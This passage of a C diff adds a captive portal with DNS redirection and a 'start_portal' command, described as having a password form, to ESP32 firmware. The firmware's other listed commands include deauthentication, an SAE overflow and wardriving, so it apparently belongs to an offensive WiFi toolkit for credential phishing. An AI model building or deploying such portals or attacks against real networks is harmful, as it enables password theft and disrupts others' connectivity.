+    httpd_register_uri_handler(portal_server, &captive_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint
+    httpd_uri_t captive_api_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_GET,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint for POST/OPTIONS
+    httpd_uri_t captive_api_post_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_POST,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint for OPTIONS
+    httpd_uri_t captive_api_options_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_OPTIONS,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
+    
+    // Set portal as active (must be before starting DNS task)
+    portal_active = true;
+    MY_LOG_INFO(TAG, "Portal marked as active");
+    
+    // Start DNS server task
+    BaseType_t task_ret = xTaskCreate(
+        dns_server_task,
+        "dns_server",
+        4096,
+        NULL,
+        5,
+        &dns_server_task_handle
+    );
+    
+    if (task_ret != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create DNS server task");
+        portal_active = false;
+        httpd_stop(portal_server);
+        portal_server = NULL;
+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "DNS server task started");
+    
+    MY_LOG_INFO(TAG, "Captive portal started successfully!");
+    MY_LOG_INFO(TAG, "AP Name: Portal");
+    MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
+    MY_LOG_INFO(TAG, "Connect to 'Portal' WiFi network to access the portal");
+    MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
+    MY_LOG_INFO(TAG, "HTTP server running on port 80");
+    
+    return 0;
+}
+
 // --- Command registration in esp_console ---
 static void register_commands(void)
 {
@@ -2045,6 +2869,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));
 
+    const esp_console_cmd_t portal_cmd = {
+        .command = "start_portal",
+        .help = "Starts captive portal with password form",
+        .hint = NULL,
+        .func = &cmd_start_portal,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
+
     const esp_console_cmd_t stop_cmd = {
         .command = "stop",
         .help = "Stop all running operations",
@@ -2128,6 +2961,7 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  start_deauth");
     MY_LOG_INFO(TAG,"  sae_overflow");
     MY_LOG_INFO(TAG,"  start_wardrive");
+    MY_LOG_INFO(TAG,"  start_portal");
     MY_LOG_INFO(TAG,"  start_sniffer");
     MY_LOG_INFO(TAG,"  show_sniffer_results");
     MY_LOG_INFO(TAG,"  show_probes");
@@ -2146,7 +2980,7 @@ void app_main(void) {
  
     ESP_ERROR_CHECK(esp_console_start_repl(repl));
     vTaskDelay(pdMS_TO_TICKS(500));
-    MY_LOG_INFO(TAG,"BOARD READY");
+    MY_LOG_INFO(TAG,"BOARD READY v6");
     vTaskDelay(pdMS_TO_TICKS(100));
 }
 
